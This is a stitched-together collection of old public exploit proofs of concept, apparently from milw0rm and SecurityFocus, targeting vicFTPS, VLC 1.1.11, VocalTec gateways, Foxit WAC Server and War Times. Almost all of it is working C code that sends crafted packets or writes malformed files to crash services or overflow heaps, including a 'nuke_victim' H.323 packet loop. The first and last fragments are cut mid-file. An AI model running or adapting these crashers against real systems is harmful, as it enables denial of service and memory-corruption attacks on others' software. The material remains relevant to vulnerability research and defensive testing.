    printf("\nError: the server has closed the connection, it's probably not vulnerable\n");
    exit(1);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = num >> (i << 3);
    }
    return(bytes);
}



int putss(u8 *data, u8 *val, int len) {
    strncpy(data, val, len);
    return(len);
}



int send_ventrilo(int sd, ventrilo_key_ctx *client, u8 *buff, int len) {
    u8      tmp[2];

    if(client) {
        ventrilo_enc(client, buff, len);
    } else {
        ventrilo_first_enc(buff, len);
    }

    tmp[0] = len >> 8;
    tmp[1] = len;
    if(send(sd, tmp,  2,   0) != 2)   return(-1);
    if(send(sd, buff, len, 0) != len) return(-1);
    return(0);
}



int recv_ventrilo(int sd, ventrilo_key_ctx *server, u8 *buff) {
    int     t;
    u16     i,
            len;

    if(timeout(sd, TIMEOUT) < 0) return(-1);
    if(recv(sd, (void *)&len, 1, 0)     < 0)  return(-1);
    if(timeout(sd, TIMEOUT) < 0) return(-1);
    if(recv(sd, (void *)&len + 1, 1, 0) < 0)  return(-1);
    len = ntohs(len);

    for(i = 0; i != len; i += t) {
        t = recv(sd, buff + i, len - i, 0);
        if(t <= 0) return(-1);
    }

    if(server) {
        ventrilo_dec(server, buff, len);
    } else {
        ventrilo_first_dec(buff, len);
    }
    return(len);
}



int rndxx(u8 *data, int len, u32 *seed, int fixlen) {
    u32     rnd,
            size;
    u8      *p;
    static const char table[] =
                "0123456789"
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "abcdefghijklmnopqrstuvwxyz";

    rnd  = *seed;
    size = len;

    if(!fixlen) {
        len = rnd % len;
        if(len < 3) len = 3;
    }
    for(p = data; --len; p++) {
        rnd = (rnd * 0x343FD) + 0x269EC3;
        rnd = ~((rnd >> 1) - 1);
        *p = table[rnd % (sizeof(table) - 1)];
    }
    for(len = p - data; len < size; len++) {
        *p++ = 0;
    }
    *seed = rnd;
    return(p - data);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n",
                host);
            exit(1);
        } else host_ip = *(u32 *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


#include <cstdio>
#include <winsock2.h>
#include <memory.h>
#define __z00ro(a) memset(a,0,sizeof(a));

//greetings : SiD.psycho 
//Smallest greetings : Gorion  - lofamy cIem We want be like y0U :***

unsigned int setport(const char* port){
       if((atoi(port)==0) || (atoi(port)<0)){
       return 21;
       }
       return atoi(port);                               
}         

int main(int argc,char **argv){

printf("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
       "+=========== vicFTPS v 5.0 REMOTE dos POC ;[      ===========+\n"
       "+=========== Alfons Luja sp Z.0.0                 ===========+\n"
       "+=========== I want clear b00f not a d0s !!!      ===========+\n"
       "+=========== Propably 0 dAy                       ===========+\n"
       "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n");
if(argc<3){
   printf("\nuse poc.exe IP PORT\n");
   return 0;
}
int socks;
hostent *host;
WSADATA WSA;
SOCKADDR_IN aip;
char recvs[666]={0}; //ave
char test[66]={0};  // 4 nothing
const char *login = "USER Anonymous\r\n";    
const char *pass = "PASS echo@gov.tr\r\n";
strcpy(test,"LIST /\\/iWana_be_like_Gorion\\");
memset(test+strlen("LIST /\\/iWana_be_like_Gorion\\"),0x42,sizeof(test));
test[sizeof(test)-2]='\r';
test[sizeof(test)-1]='\n';
test[sizeof(test)]='\0';
printf("\nTarget:%s\nPort:%u\n",argv[1],setport(argv[2]));
if((WSAStartup(MAKEWORD(4, 2), &WSA))==0){
    if((socks = socket(AF_INET,SOCK_STREAM,0)) != -1){
         aip.sin_family = AF_INET;
         aip.sin_addr.s_addr = inet_addr(argv[1]);
         aip.sin_port = htons(setport(argv[2]));
         memset(&(aip.sin_zero),'0',8);
     if(connect(socks,(struct sockaddr*)&aip,sizeof(struct sockaddr)) == 0){
         recv(socks,recvs,sizeof(recvs)-1,0);
         __z00ro(recvs);
         send(socks,login,strlen(login),0);
         recv(socks,recvs,sizeof(recvs)-1,0);
         __z00ro(recvs);
         send(socks,pass,strlen(pass),0);
         recv(socks,recvs,sizeof(recvs)-1,0);     
         printf("%s",recvs);
          if(!strncmp(recvs,"230 fake user logged in.",3)){
             printf("Send greeting!!\n");  
             __z00ro(recvs);
             send(socks,test,sizeof(test),0);  
             recv(socks,recvs,sizeof(recvs)-1,0);   
             Sleep(200); 
             printf("Server is charmed and died happy!!\n");     
          }
          else{
             printf("Target dont love us . You must have account :[\r\n");
             closesocket(socks);       
             WSACleanup();
             return 0;     
          }                       
         }
       else {
       printf("(__eRROR):[Connection  error](!!!!)\n"
              "It can be bad port number or IP addresss!\n");
       closesocket(socks);       
       WSACleanup();
       return 0;    
       }       
      }
      WSACleanup();
     }   
return 0;       
}


//~~@KND http://pl.youtube.com/watch?v=KvFAx3ArmlE ~@~

// milw0rm.com [2008-10-24]
source: http://www.securityfocus.com/bid/64626/info

VLC Media Player is prone to a denial-of-service vulnerability.

Successful exploits may allow attackers to crash the affected application, denying service to legitimate users.

VLC Media Player 1.1.11 is vulnerable; other versions may also be affected. 

# Exploit Title: VLC v. 1.1.11 .eac3 DOS
# Date: 3/14/2012
# Author: Dan Fosco
# Vendor or Software Link: www.videolan.org
# Version: 1.1.11
# Category:: local
# Google dork: n/a
# Tested on: Windows XP SP3 (64-bit)
# Demo site: n/a

#include <stdio.h>

int main(int argc, char *argv[])
{
	FILE *f;
	f = fopen(argv[1], "r+");
	fseek(f, 5, SEEK_SET);
	fputc('\x00', f);
	fclose(f);
	return 0;
}

//code updates eac3 file, can find samples on videolan ftp server


source: http://www.securityfocus.com/bid/64623/info

VLC Media Player is prone to a denial-of-service vulnerability.

Successful exploits may allow attackers to crash the affected application, denying service to legitimate users.

VLC Media Player 1.1.11 is vulnerable; other versions may also be affected. 

# Exploit Title: VLC v. 1.1.11 .nsv DOS
# Date: 3/14/2012
# Author: Dan Fosco
# Vendor or Software Link: www.videolan.org
# Version: 1.1.11
# Category: local
# Google dork: n/a
# Tested on: Windows XP SP3 (64-bit)
# Demo site: n/a

#include <stdio.h>

int main()
{
	FILE *f;
	f = fopen("dos.nsv", "w");
	fputs("\x4e\x53\x56\x66", f);
	fputc('\x00', f);
	fputc('\x00', f);
	fputc('\x00', f);
	fputc('\x00', f);
	fclose(f);
	return 0;
}

//use code for creating malicious file

edit:  works on 2.0.1.0


source: http://www.securityfocus.com/bid/10411/info

It has been reported that the VocalTec VGW120 and VGW480 Telephony Gateways are prone to a remote denial of service vulnerability. The issue is reported to exist in the ASN.1/H.323/H.225 stack.

A remote attacker may exploit this issue to deny service to the affected appliances. 

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>

#define H323_SIGNAL_PORT 1720

unsigned char kill_buff[] = {\
0x03, 0x00, 0x01, 0x57, 0x08, 0x02, 0x00, 0x04, 0x05, 0x04, 0x03, 0x80, 0x90, 0xa5, 0x6c, 0x0b,
0x81, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x70, 0x0c, 0x81, 0x31, 0x32,
0x33, 0x34, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x7e, 0x01, 0x2b, 0x05, 0x20, 0x80, 0x06,
0x00, 0x08, 0x91, 0x4a, 0x00, 0x04, 0x28, 0x00, 0xb5, 0x00, 0x00, 0x12, 0x40, 0x01, 0x3c, 0x05,
0x01, 0x00, 0x00, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x61, 0x62, 0x63, 0x64, 0x65,
0x66, 0x67, 0x68, 0x00, 0x8d, 0x1d, 0x82, 0x07, 0x00, 0xac, 0x10, 0x01, 0x01, 0x02, 0x9a, 0x11,
0x00, 0x62, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67,
0x68, 0x32, 0x02, 0x12, 0x00, 0x00, 0x00, 0x0d, 0x40, 0x01, 0x80, 0x0a, 0x04, 0x00, 0x01, 0x00,
0xac, 0x10, 0x01, 0x01, 0x47, 0xf1, 0x1d, 0x40, 0x00, 0x00, 0x06, 0x04, 0x01, 0x00, 0x4d, 0x40,
0x01, 0x80, 0x11, 0x14, 0x00, 0x01, 0x00, 0xac, 0x10, 0x01, 0x01, 0x47, 0xf0, 0x00, 0xac, 0x10,
0x01, 0x01, 0x47, 0xf1, 0x01, 0x00, 0x01, 0x00, 0x01, 0x80, 0x01, 0x80, 0x00, 0x0a, 0xa8, 0x01,
0x80, 0x6f, 0x01, 0x40, 0xb5, 0x00, 0x00, 0x12, 0x68, 0xe0, 0x01, 0x01, 0x00, 0x01, 0x1c, 0x58,
0x1c, 0x39, 0x9e, 0x01, 0x00, 0x03, 0x67, 0x74, 0x64, 0x00, 0x00, 0x00, 0x2e, 0x49, 0x41, 0x4d,
0x2c, 0x0d, 0x0a, 0x47, 0x43, 0x49, 0x2c, 0x33, 0x39, 0x61, 0x65, 0x65, 0x31, 0x35, 0x65, 0x62,
0x66, 0x31, 0x38, 0x31, 0x31, 0x64, 0x33, 0x38, 0x30, 0x30, 0x62, 0x64, 0x39, 0x63, 0x39, 0x65,
0x62, 0x30, 0x62, 0x31, 0x33, 0x35, 0x65, 0x0d, 0x0a, 0x0d, 0x0a, 0xa1, 0x04, 0x03, 0x90, 0x90,
0xa3, 0x18, 0x03, 0xa1, 0x83, 0x9f, 0x1e, 0x02, 0x81, 0x83, 0x70, 0x0c, 0x81, 0x37, 0x30, 0x39,
0x35, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x04, 0x80, 0x06, 0x00, 0x04, 0x00, 0x00, 0x00,
0x03, 0x35, 0x02, 0x04, 0x67, 0x74, 0x64, 0x01, 0x2e, 0x49, 0x41, 0x4d, 0x2c, 0x0d, 0x0a, 0x47,
0x43, 0x49, 0x2c, 0x33, 0x39, 0x61, 0x65, 0x65, 0x31, 0x35, 0x65, 0x62, 0x66, 0x31, 0x38, 0x31,
0x31, 0x64, 0x33, 0x38, 0x30, 0x30, 0x62, 0x64, 0x39, 0x63, 0x39, 0x65, 0x62, 0x30, 0x62, 0x31,
0x33, 0x35, 0x65, 0x0d, 0x0a, 0x0d, 0x0a};

int nuke_victim(char * ip)
{
 int sock;
 struct sockaddr_in vict_addr;
 
 if ((sock=socket(AF_INET, SOCK_STREAM, 0))==-1)
  {
  perror("nuke_victim()::socket()");
  return -1;
  }
 memset(&vict_addr, 0, sizeof(vict_addr));
 vict_addr.sin_family=AF_INET;
 inet_pton(AF_INET, ip, &vict_addr.sin_addr);
 vict_addr.sin_port=htons(H323_SIGNAL_PORT);
 if (connect(sock, (struct sockaddr *) &vict_addr, sizeof(vict_addr))==-1)
  {
  close(sock);
  if (errno==ECONNREFUSED) return 1;
  perror("nuke_victim()::connect()");
  return -1;
  }
 if (send(sock,kill_buff,sizeof(kill_buff),MSG_NOSIGNAL)!=sizeof(kill_buff))
  {
  close(sock);
  if (errno==EPIPE) return 1;
  perror("nuke_victim()::send()");
  return -1;
  }
 close(sock);
 return 0;
}

int main(int argc, char ** argv)
{
 int ret_flag=0;
 int try_count=0;
 if (argc<2)
  {
  fprintf(stderr, "Usage: %s <victim IP>\n", argv[0]);
  return 1;
  }
 while((ret_flag=nuke_victim(argv[1]))==0) 
  {
  try_count++;
  usleep(100000);
  }
 if (ret_flag==-1) printf("Execution aborted with internal error\n");
 if (ret_flag==1) printf("Victim %s successfully nuked with %d tryes\n", argv[1], try_count);
 return 0;
}

/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        23
#define BOFSZ       400



int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            i;
    u16     port    = PORT;
    u8      buff[1024],
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Foxit WAC Server <= 2.1.0.910 crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    if((timeout(sd, 3) < 0) || (recv(sd, buff, sizeof(buff), 0) <= 0)) goto quit;

    printf("- send set option\n");
    p = buff;
    *p++ = 0xff;        // telnet option
    *p++ = 0xfa;        // set option
    *p++ = 0x00;        // option
    for(i = 0; i < BOFSZ; i++) {
        *p++ = 'A';
    }
    *p++ = 0xff;        // telnet option
    *p++ = 0xf0;        // set option
    if(send(sd, buff, p - buff, 0) < 0) goto quit;

    if((timeout(sd, 3) < 0) || (recv(sd, buff, sizeof(buff), 0) <= 0)) {
        printf("- server should have been crashed\n");
    }

    close(sd);
    printf("- done\n");
    return(0);
quit:
    printf("\nError: something wrong during communication with the server\n");
    close(sd);
    return(1);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define BUFFSZ      0xffff
#define BOF1SZ      600
#define BOF2SZ      60000

#define SSH2_MSG_DISCONNECT 1
#define SSH2_MSG_KEXINIT    20



int ssh_send(int sd, int type, u8 *buff, int len);
int str_recv(int sd, u8 *buff, int buffsz);
int tcp_recv(int sd, u8 *buff, int len);
int ssh_recv(int sd, u8 *buff);
int putsh(u8 *dst, u8 *str);
int putcc(u8 *data, int chr, int len);
int getxx(u8 *data, u32 *ret, int bits);
int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            attack;
    u16     port;
    u8      *buff,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "WAC Server <= 2.0 Build 3503 double heap overflow "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port]\n"
            "\n"
            "Attack:\n"
            " 1 = telnet option heap overflow (default port 23)\n"
            " 2 = SSH packet heap overflow (default port 22)\n"
            "\n", argv[0]);
        exit(1);
    }

    attack = atoi(argv[1]);
    switch(attack) {
        case 1: port    = 23;   break;
        case 2: port    = 22;   break;
        default: {
            printf("\nError: wrong attack number (%s)\n", argv[1]);
            exit(1);
            } break;
    }

    if(argc > 3) port = atoi(argv[3]);
    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    if(attack == 1) {
        if((timeout(sd, 3) < 0) || (recv(sd, buff, sizeof(buff), 0) <= 0)) goto quit;

        printf("- send set option\n");
        p = buff;
        *p++ = 0xff;        // telnet option
        *p++ = 0xfa;        // set option
        *p++ = 0x00;        // option
        p += putcc(p, 'A', BOF1SZ);
        *p++ = 0xff;        // telnet option
        *p++ = 0xf0;        // set option
        if(send(sd, buff, p - buff, 0) < 0) goto quit;

        if((timeout(sd, 3) < 0) || (recv(sd, buff, sizeof(buff), 0) <= 0)) {
            printf("- server should have been crashed\n");
        }

    } else if(attack == 2) {
        if(str_recv(sd, buff, BUFFSZ) < 0) goto quit;
        printf("- received banner: %s\n", buff);

        #define SSHBANNER   "SSH-2.0-OpenSSH_4.7p1\r\n"
        if(send(sd, SSHBANNER, sizeof(SSHBANNER) - 1, 0) < 0) goto quit;

        p = buff;
        p += putxx(p, 0,        32);        // reason
        p += putxx(p, BOF2SZ,   32);        // string size
          p += putcc(p, 'A',    BOF2SZ);    // string
        p += putsh(p, "");

        if(ssh_send(sd, SSH2_MSG_DISCONNECT, buff, p - buff) < 0) goto quit;
        if(ssh_recv(sd, buff) < 0) goto quit;
    }

quit:
    close(sd);
    free(buff);
    printf("- done\n");
    return(0);
}



int ssh_send(int sd, int type, u8 *buff, int len) {
    int     rem;
    u8      tmp[16];

    rem = (((len + 6) + 15) & (~15)) - (len + 6);
    printf("- %d bytes sent (%d + %d)\n", 6 + len + rem, len, rem);

    putxx(tmp, 1 + 1 + len + rem, 32);
    tmp[4] = rem;
    tmp[5] = type;
    if(send(sd, tmp,  6,       0) != 6)   return(-1);

    if(len) {
        if(send(sd, buff, len, 0) != len) return(-1);
    }
    if(rem) {
        memset(tmp, 0, rem);
        if(send(sd, tmp,  rem, 0) != rem) return(-1);
    }
    return(0);
}



int str_recv(int sd, u8 *buff, int buffsz) {
    int     len,
            t;

    buffsz--;
    for(len = 0; len < buffsz; len++) {
        if(timeout(sd, 3) < 0) return(-1);
        t = recv(sd, buff + len, 1, 0);
        if(t <= 0) return(-1);
        if(buff[len] == '\n') break;
        if(buff[len] == '\r') buff[len] = 0;
    }
    buff[len] = 0;
    return(0);
}



int tcp_recv(int sd, u8 *buff, int len) {
    int     t;
    u8      *p;

    for(p = buff; len; p += t, len -= t) {
        if(timeout(sd, 3) < 0) return(-1);
        t = recv(sd, p, len, 0);
        if(t <= 0) return(-1);
    }
    return(0);
}



int ssh_recv(int sd, u8 *buff) {
    u32     len;
    u8      tmp[4];

    if(tcp_recv(sd, tmp, 4) < 0) return(-1);
    getxx(tmp, &len, 32);
    if(len > BUFFSZ) return(0);
    if(tcp_recv(sd, buff, len) < 0) return(-1);
    printf("- %d bytes received\n", len);
    return(len);
}



int putsh(u8 *dst, u8 *str) {
    int     len;

    len = strlen(str);
    putxx(dst, len, 32);
    memcpy(dst + 4, str, len);
    return(4 + len);
}



int putcc(u8 *data, int chr, int len) {
    memset(data, chr, len);
    return(len);
}



int getxx(u8 *data, u32 *ret, int bits) {
    u32     num;
    int     i,
            bytes;

    bytes = bits >> 3;

    for(num = i = 0; i < bytes; i++) {
        num |= (data[i] << ((bytes - 1 - i) << 3));
    }

    *ret = num;
    return(bytes);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;

    for(i = 0; i < bytes; i++) {
        data[i] = (num >> ((bytes - 1 - i) << 3)) & 0xff;
    }

    return(bytes);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER         "0.1"
#define BUFFSZ      65536
#define PORT        1939
#define TIMEOUT     5
#define MAXSOCK     17
#define DATASZ      64

#define SHOW(x)     printf(x "%s\n", p); \
                    p += DATASZ;



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int wait);
void wartimes_send(int sd, u_char *data, u_long len, u_long type);
int wartimes_recv(int sd, u_char *buff, int readlen);
void check_tcp_fakes(int *sd, int num, u_char *buff, int buffsz);
int create_rand_string(u_char *data, int len, u_int tmp);
int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd[MAXSOCK],
            i,
            len;
    u_short port = PORT,
            server_port;
    u_char  *buff,
            password[DATASZ + 1],
            server_name[DATASZ],
            server_ver[DATASZ],
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    setbuf(stdout, NULL);

    fputs("\n"
        "War Times <= 1.03 in-game server crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%d)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    buff = malloc(BUFFSZ + 1);
    if(!buff) std_err();

    fputs("- request informations:\n", stdout);
    sd[0] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd[0] < 0) std_err();
    if(connect(sd[0], (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    len = send_recv(sd[0], "\x01", 1, buff, BUFFSZ, 0);
    close(sd[0]);

    buff[len] = 0x00;
    p = buff + 1;
    memcpy(server_name, p, DATASZ);
    SHOW("\n  Server name:      ");
    SHOW("  Admin:            ");
    SHOW("  Server IP:        ");
    server_port = *(u_short *)p;
    printf("  Server port:      %hu\n", server_port);
    p += 2 + DATASZ;
    memcpy(server_ver, p, DATASZ);
    SHOW("  Server version:   ");
    SHOW("  Map:              ");

    *password = 0x00;

    fputs("\n- start attack:\n", stdout);
    for(i = 0; i < MAXSOCK; i++) {  // only 2 times are needed
        printf("\n  Try %d: ", i);

        sd[i] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sd[i] < 0) std_err();

        if(connect(sd[i], (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();

        p = buff;
        *p++ = 0x04;
        strncpy(p, server_name, DATASZ);    p += DATASZ;
        memset(p, 'a', DATASZ);             p += DATASZ;
        strncpy(p, password, DATASZ);       p += DATASZ;
        strncpy(p, server_ver, DATASZ);     p += DATASZ;
        *(u_short *)p = server_port;        p += 2;

        if(send_recv(sd[i], buff, p - buff, buff, BUFFSZ, 1) < 0) {
            fputs("\n- socket timeout, probably the server is crashed\n", stdout);
            break;
        }

        if(buff[0] == 0x06) {
            if(buff[1] == 2) {
                fputs("\nError: server full\n\n", stdout);
                exit(1);

            } else if(buff[1] == 1) {
                fputs("\n- same player name, retry\n", stdout);
                close(sd[i--]);
                continue;

            } else if(buff[1] == 3) {
                fputs("\n- Server is protected by password, insert it:\n  ", stdout);
                fflush(stdin);
                fgets(password, sizeof(password) - 1, stdin);
                password[strlen(password) - 1] = 0x00;
                close(sd[i--]);
                continue;

            } else {
                printf("\nError: the player has not been accepted for the error 0x%08lx\n\n",
                    *(u_long *)(buff + 1));
                exit(1);
            }
        }
    }

    for(; i >= 0; i--) close(sd[i]);

    fputs("- check server:\n", stdout);
    sd[0] = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd[0] < 0) std_err();
    if(connect(sd[0], (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    if(send_recv(sd[0], "\x01", 1, buff, BUFFSZ, 1) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        fputs("\nServer doesn't seem vulnerable\n\n", stdout);
    }
    close(sd[0]);

    return(0);
}



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int wait) {
    int     len;

    wartimes_send(sd, in, insz, 0);
    if(wait) {
        if(timeout(sd) < 0) return(-1);
    }
    wartimes_recv(sd, out, 4);
    wartimes_recv(sd, out, 4);
    len = *(u_long *)out;
    if(len > outsz) exit(1);    // big data
    return(wartimes_recv(sd, out, len));
}



void wartimes_send(int sd, u_char *data, u_long len, u_long type) {
    int     tmp = len;

    if(send(sd, (void *)&type, 4, 0)
      < 0) std_err();
    if(send(sd, (void *)&tmp, 4, 0)
      < 0) std_err();
    if(send(sd, data, len, 0)
      < 0) std_err();
    fputc('.', stdout);
}



int wartimes_recv(int sd, u_char *buff, int readlen) {
    int     tmp,
            len;

    for(len = 0; len < readlen; len += tmp) {
        tmp = recv(sd, buff + len, readlen - len, 0);
        if(tmp < 0) std_err();
        if(!tmp) break;
        fputc('.', stdout);
    }
    return(len);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

/**********main.cpp***********/
#include <stdio.h>
#include <string>
using namespace std;

#ifdef WIN32
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#define close closesocket
#define write(a,b,c) send(a, b, c, 0)
#define writeto(a,b,c,d,e) sendto(a, b, c, 0, d, e)
#define read(a,b,c) recv(a, b, c, 0)
#define readfrom(a,b,c,d,e) recvfrom(a, b, c, 0, d, e)
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <arpa/inet.h>
#define closesocket close
#define SOCKET int
#define DWORD unsigned long
#endif

char *craft_pkt =
       "MESSAGE sip:[FROMUSER]@[DOMAIN] SIP/2.0\r\n"
       "Via: SIP/2.0/UDP [FROMADDR]:[LOCALPORT];branch=[BRANCH]\r\n"
       "From: [FROMUSER] <sip:[FROMADDR]:[LOCALPORT]>;tag=[TAG]\r\n"
       "To: <sip:[TOADDR]>\r\n"
       "Call-ID: [CALLID]@[DOMAIN]\r\n"
       "CSeq: [CSEQ] MESSAGE\r\n"
       "Contact: <sip:[FROMUSER]@[DOMAIN]:[LOCALPORT]>\r\n"
       "Content-Length: 0\r\n\r\n";

void socket_init()
{
#ifdef WIN32
       WSADATA wsaData;
       WSAStartup(MAKEWORD(2,0), &wsaData);
#endif
}

unsigned long resolv(const char *host)
{
       struct hostent             *hp;
       unsigned long              host_ip;

       host_ip = inet_addr(host);
       if( host_ip == INADDR_NONE )
       {
